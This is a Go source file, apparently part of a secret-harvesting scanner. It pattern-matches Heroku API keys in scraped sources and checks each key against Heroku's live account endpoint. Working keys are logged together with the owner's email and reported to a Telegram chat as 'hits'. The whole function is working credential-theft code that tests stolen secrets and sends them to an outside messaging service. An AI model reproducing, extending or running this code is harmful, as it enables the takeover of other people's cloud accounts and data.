package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var herokuPattern = regexp.MustCompile(`(?i)(?:heroku[_-]?(?:api[_-]?)?(?:key|token))["'\s:=]+([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})`)

func (a *AWSScanner) CheckHeroku(key, sourceURL string) bool {
	if !a.Config.APIValidation.Heroku {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "heroku_found.txt")

	req, err := http.NewRequest("GET", "https://api.heroku.com/account", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/vnd.heroku+json; version=3")
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res struct {
		Email string `json:"email"`
		Name  string `json:"name"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := res.Email
	if info == "" {
		info = res.Name
	}

	a.logValid("Heroku", fmt.Sprintf("Key: %s | Account: %s", key, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_heroku.txt")
	a.storeValidKeyLimit("Heroku", key, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("🟣", "HEROKU", sourceURL) + fmt.Sprintf(
		"Key : %s\nAccount : %s\n", key, info)
	go a.sendTelegram(msg)
	return true
}
